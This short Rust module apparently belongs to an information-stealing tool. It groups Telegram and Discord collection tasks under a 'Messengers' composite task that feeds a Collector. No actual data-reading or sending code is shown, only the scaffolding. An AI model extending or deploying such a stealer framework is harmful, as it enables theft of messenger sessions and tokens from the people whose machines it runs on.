#![no_std]
#![allow(unsafe_op_in_unsafe_fn)]

extern crate alloc;
use crate::alloc::borrow::ToOwned;
mod telegram;
mod discord;

use crate::discord::DiscordTask;
use crate::telegram::TelegramTask;
use alloc::vec;
use collector::Collector;
use tasks::{composite_task, impl_composite_task_runner, CompositeTask, Task};

pub struct MessengersTask<C: Collector> {
    inner: CompositeTask<C>
}

impl<C: Collector> MessengersTask<C> {
    pub fn new() -> Self {
        Self {
            inner: composite_task!(
                TelegramTask,
                DiscordTask
            )
        }
    }
}

impl_composite_task_runner!(MessengersTask<C>, "Messengers");